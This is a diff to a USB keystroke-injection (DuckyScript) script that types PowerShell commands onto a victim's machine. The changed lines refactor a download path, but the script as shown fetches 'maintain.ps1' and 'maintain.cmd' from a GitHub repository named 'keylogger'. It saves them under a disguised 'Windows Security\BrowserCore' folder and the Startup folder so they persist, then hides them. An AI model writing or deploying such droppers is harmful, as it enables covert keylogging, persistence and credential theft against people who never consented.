@@ -31,6 +31,9 @@ DELAY 200
 STRING $filedest = 'C:\Users\' + $username + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\maintain.cmd'
 ENTER
 DELAY 200
+STRING $DownDest = 'C:\Users\' + $username + '\Downloads\maintain.cmd'
+ENTER
+DELAY 200
 STRING Invoke-Webrequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/maintain.ps1" -OutFile "C:\Program Files\Windows Security\BrowserCore\maintain.ps1"
 ENTER
 DELAY 200
@@ -61,10 +64,10 @@ DELAY 200
 STRING }
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/maintain.cmd" -OutFile 'C:\Users\' + $username + '\Downloads\maintain.cmd'
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/maintain.cmd" -OutFile $DownDest
 ENTER
 DELAY 200
-STRING Move-Item -Path 'C:\Users\' + $username + '\Downloads\maintain.cmd' -Destination $filedest
+STRING Move-Item -Path $DownDest -Destination $filedest
 ENTER
 DELAY 200
 STRING $HIDE=Get-Item $dest -Force
